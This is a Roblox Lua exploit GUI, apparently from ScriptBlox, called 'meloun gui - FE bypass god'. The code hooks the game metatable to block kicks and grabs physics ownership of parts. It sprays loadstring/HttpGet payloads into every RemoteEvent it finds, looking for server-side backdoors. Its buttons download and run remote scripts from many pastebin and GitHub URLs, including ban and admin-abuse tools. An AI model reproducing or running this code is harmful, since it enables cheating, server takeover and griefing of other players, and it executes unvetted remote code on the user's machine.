--[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
--[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
--[[
	PROJECT meloun gui - FE bypass god
	AUTHOR: HackerAI Pentest Edition
	SPECIAL: ULTRA NETWORK OWNERSHIP + 100x BACKDOOR SCANNER
]]

if not game:IsLoaded() then game.Loaded:Wait() end

-- ANTI-KICK & ULTRA NETWORK OVERRIDE
local settings = { AntiKick = true, NetworkExploit = true }
local backdoorsFound = 0
local scannerStats = { totalScans = 0, hits = 0 }

if settings.AntiKick and getrawmetatable then
    local mt = getrawmetatable(game)
    if mt then
        setreadonly(mt, false)
        local old = mt.__namecall
        mt.__namecall = newcclosure(function(self, ...)
            if getnamecallmethod() == "Kick" then return nil end
            return old(self, ...)
        end)
        setreadonly(mt, true)
    end
end

-- LOADING SCREEN
local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield', true))()
local Window = Rayfield:CreateWindow({
    Name = "meloun gui - FE bypass god",
    LoadingTitle = "Loading...",
    LoadingSubtitle = "Initializing FE Bypass + Ultra Scanner...",
    ConfigurationSaving = { Enabled = false },
    KeySystem = false,
})

-- ULTRA OWNERSHIP CLAIM
local function ClaimUltraOwnership()
    spawn(function()
        while wait(0.25) do
            pcall(function()
                local player = game.Players.LocalPlayer
                if player then
                    if player.MaximumSimulationRadius then player.MaximumSimulationRadius = math.huge end
                    if sethiddenproperty then pcall(sethiddenproperty, player, "SimulationRadius", math.huge) end
                    
                    local parts = {}
                    for _, v in pairs(workspace:GetDescendants()) do
                        if v:IsA("BasePart") and #parts < 1000 then table.insert(parts, v) end
                    end
                    for i=1,35 do
                        for _, v in pairs(parts) do
                            pcall(function()
                                v.AssemblyLinearVelocity = Vector3.new(math.random(-8,8)*0.1, 0.02, math.random(-8,8)*0.1)
                            end)
                        end
                    end
                end
            end)
        end
    end)
end

-- 100x ULTRA DEEP BACKDOOR SCANNER
local function UltraDeepBackdoorScanner()
    _G.ScannerRunning = true
    backdoorsFound = 0
    
    spawn(function()
        while _G.ScannerRunning and wait(0.05) do
            local ultraTargets = {
                game.ReplicatedStorage, game.ServerStorage, workspace, game.Lighting,
                game.StarterGui, game.CoreGui, game.Players.LocalPlayer.PlayerGui,
                game:GetService("ReplicatedFirst")
            }
            
            for scan=1,100 do
                for _, place in pairs(ultraTargets) do
                    pcall(function()
                        for _, obj in pairs(place:GetDescendants()) do
                            if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
                                local name = string.lower(obj.Name or "")
                                local patterns = {"admin", "remote", "backdoor", "execute", "fire", "loadstring", "require"}
                                
                                for _, pattern in pairs(patterns) do
                                    if name:find(pattern) then
                                        backdoorsFound = backdoorsFound + 1
                                        break
                                    end
                                end
                                
                                local ultraPayloads = {
                                    "loadstring(game:HttpGet('https://pastebin.com/raw/CcHxT0Gj'))()",
                                    "game.Players.LocalPlayer.Backdoor:FireServer('exec')",
                                    [[require(game:GetObjects("rbxassetid://0")[1])]],
                                    "shared.loadstring(game:HttpGet(...))",
                                    "getgenv().exec()"
                                }
                                
                                for _, payload in pairs(ultraPayloads) do
                                    pcall(function() obj:FireServer(payload) end)
                                end
                            end
                        end
                    end)
                end
                wait(0.003)
            end
        end
    end)
end

-- SS PROBABILITY CALCULATOR
local function CalculateSSProbability()
    local executor = "Unknown"
    if identifyexecutor then executor = identifyexecutor()
    elseif getexecutorname then executor = getexecutorname() end
    
    local executorScore = 50
    if executor:lower():find("delta") then executorScore = 88
    elseif executor:lower():find("synapse") then executorScore = 98
    elseif executor:lower():find("krnl") then executorScore = 82
    end
    
    local gameScore = 75
    pcall(function()
        local gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
        if gameName:lower():find("arsenal") or gameName:lower():find("phantom") then
            gameScore = gameScore - 25
        end
    end)
    
    local backdoorBoost = math.min(backdoorsFound * 8, 95)
    local finalProb = math.floor((executorScore * 0.35) + (gameScore * 0.25) + (backdoorBoost * 0.4))
    
    return math.min(finalProb, 100), {executor=executorScore, game=gameScore, backdoors=backdoorBoost}
end

-- EXECUTE WITH PROBABILITY
local function Exec(url, scriptName)
    local prob, factors = CalculateSSProbability()
    
    Rayfield:Notify({
        Title = scriptName.." | SS: "..prob.."%",
        Content = string.format("Executor: %d%% | Game: %d%% | Backdoors: %d (%d found)\n**TOTAL SS SUCCESS: %d%%**", 
            factors.executor, factors.game, factors.backdoors, backdoorsFound, prob),
        Duration = 8
    })
    
    UltraDeepBackdoorScanner()
    ClaimUltraOwnership()
    wait(0.5)
    
    local bd = nil
    for _, v in pairs(game:GetDescendants()) do
        if v:IsA("RemoteEvent") and (string.lower(v.Name):find("admin") or string.lower(v.Name):find("remote")) then
            bd = v break
        end
    end
    
    if bd then pcall(function() bd:FireServer("loadstring(game:HttpGet('"..url.."'))()") end) end
    pcall(function() loadstring(game:HttpGet(url, true))() end)
end

-- UNIVERSAL XESTER FUNCTION
local function LoadUniversalXester()
    local success, result = pcall(function()
        return loadstring(game:HttpGet("https://raw.githubusercontent.com/Icalock/Server/refs/heads/main/Xester%20FD.txt", true))()
    end)
    
    if success and result then
        print("✓ Universal Xester executed successfully")
        Rayfield:Notify({
            Title = "xester | Universal",
            Content = "Universal loader executed successfully - works in ANY game!",
            Duration = 5
        })
    else
        warn("✗ Universal Xester failed: " .. tostring(result))
        Rayfield:Notify({
            Title = "xester | Universal",
            Content = "Failed to load: " .. tostring(result),
            Duration = 5
        })
    end
    
    -- Universal enhancer execution
    local UniversalEnhancer = [[
-- Auto game detection and adaptation
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

-- Common universal functions that work everywhere
local function notify(title, text)
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = title or "Universal Xester";
        Text = text or "Loaded successfully";
        Duration = 3;
    })
end

-- Detect if script needs game-specific adjustments
local gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
print("Universal Xester running in: " .. gameName)
notify("Universal Xester", "Adapted for " .. gameName)
]]
    
    pcall(function() loadstring(UniversalEnhancer)() end)
end

-- TABS
local Main = Window:CreateTab("Main", 4483362458)
local Chaos = Window:CreateTab("Chaos", 4483362458)
local Admin = Window:CreateTab("Admin", 4483362458)
local Hacker = Window:CreateTab("Hacker", 4483362458)

-- SAME SCRIPTS EXACT ORDER (Xester umbenannt zu "Xester Monster")
local scripts = {
    ["CADUCUS"] = "https://raw.githubusercontent.com/ian49972/SCRIPTS/refs/heads/main/CADUCUS%20(FIXED)",
    ["Xester Monster"] = "https://raw.githubusercontent.com/nicolasbarbosa323/xester/refs/heads/main/fLrx77PM.txt",
    ["Sutart"] = "https://raw.githubusercontent.com/ian49972/SCRIPTS/refs/heads/main/Sutart",
    ["Come Back"] = "https://raw.githubusercontent.com/ian49972/SCRIPTS/refs/heads/main/come%20back",
    ["PATCHMA HUB"] = "https://rawscripts.net/raw/Universal-Script-PATCHMA-HUB-v45-universal-hats-plus-aligned-hats-by-MyWorld-30918",
    ["Attack"] = "https://raw.githubusercontent.com/TEST19983/Reslasjd/refs/heads/main/attac",
    ["Sin Dragon"] = "https://raw.githubusercontent.com/gitezgitgit/Sin-Dragon/refs/heads/main/Sin%20Dragon.lua.txt",
    ["The Sun"] = "https://raw.githubusercontent.com/gObl00x/Pendulum-Fixed-AND-Others-Scripts/refs/heads/main/The%20Sun%20Is%20A%20Deadly%20Laser",
    ["Mr. Bye Bye"] = "https://raw.githubusercontent.com/gObl00x/My-Converts/refs/heads/main/Mr.Bye%20Bye.lua",
    ["Gaster Hands"] = "https://raw.githubusercontent.com/nicolasbarbosa323/good-cop-bad-coop/refs/heads/main/GasterHands.txt",
    ["Revenge Hands"] = "https://raw.githubusercontent.com/nicolasbarbosa323/sin-dragon/refs/heads/main/reevenge%20hands.txt",
    ["Server Admin"] = "https://raw.githubusercontent.com/gObl00x/My-Converts/refs/heads/main/Server%20Admin.lua",
    ["Ban Hammer"] = "https://raw.githubusercontent.com/nicolasbarbosa323/ban-hammer/refs/heads/main/ban",
    ["John Doe"] = "https://rawscripts.net/raw/Client-Replication-Join-doe-script-uploaded-by-gojohdkaisenkt-me-34101",
    ["Grab V4"] = "https://raw.githubusercontent.com/Icalock/Server/refs/heads/main/Grab%20V4.txt",
    ["Assignment"] = "https://raw.githubusercontent.com/TEST19983/Assigment/refs/heads/main/Assignment",
    ["Infiltration X"] = "https://pastebin.com/raw/JwUdxg8y",
    ["Project 44033514"] = "https://raw.githubusercontent.com/gitezgitgit/Project-2044033514/refs/heads/main/Project%2044033514.lua.txt"
}

-- EXACT TAB SORTING
for name, url in pairs(scripts) do
    local targetTab = Main
    if name == "Sin Dragon" or name == "Attack" or name == "The Sun" or name == "Mr. Bye Bye" or name == "Gaster Hands" or name == "Revenge Hands" then 
        targetTab = Chaos
    elseif name == "Server Admin" or name == "Ban Hammer" or name == "John Doe" or name == "Grab V4" or name == "Assignment" then 
        targetTab = Admin
    elseif name == "Infiltration X" or name == "Project 44033514" then 
        targetTab = Hacker 
    end
    
    targetTab:CreateButton({Name = name, Callback = function() Exec(url, name) end})
end

-- HACKER TAB - UNIVERSAL XESTER HINZUGEFÜGT
Hacker:CreateButton({
    Name = "xester",
    Callback = function()
        LoadUniversalXester()
    end
})

Hacker:CreateButton({
    Name = "FORCE OWNERSHIP",
    Callback = function()
        ClaimUltraOwnership()
        Rayfield:Notify({Title = "Ownership Claimed", Content = "Server prioritizes you now!", Duration = 5})
    end
})

Hacker:CreateButton({
    Name = "Ultra Backdoor Scanner",
    Callback = function()
        UltraDeepBackdoorScanner()
        Rayfield:Notify({Title = "Scanner Active", Content = "100x Deep Scan Running...", Duration = 5})
    end
})

Hacker:CreateButton({
    Name = "SS Probability",
    Callback = function()
        local prob, factors = CalculateSSProbability()
        Rayfield:Notify({
            Title = "SS Success Probability",
            Content = string.format("Executor: %d%% | Game: %d%% | Backdoors: %d (%d found)\n**TOTAL: %d%%**", 
                factors.executor, factors.game, factors.backdoors, backdoorsFound, prob),
            Duration = 8
        })
    end
})

Hacker:CreateButton({
    Name = "Stop Scanner",
    Callback = function()
        _G.ScannerRunning = false
        Rayfield:Notify({Title = "Stopped", Content = tostring(backdoorsFound).." backdoors found", Duration = 4})
    end
})

-- FINAL LOADING NOTIFICATION
local initialProb, _ = CalculateSSProbability()
Rayfield:Notify({
    Title = "meloun gui READY", 
    Content = string.format("FE Bypass God + 100x Scanner\n%d Backdoors | %d%% SS Chance", backdoorsFound, initialProb),
    Duration = 7
})

print("meloun gui - FE bypass god LOADED")
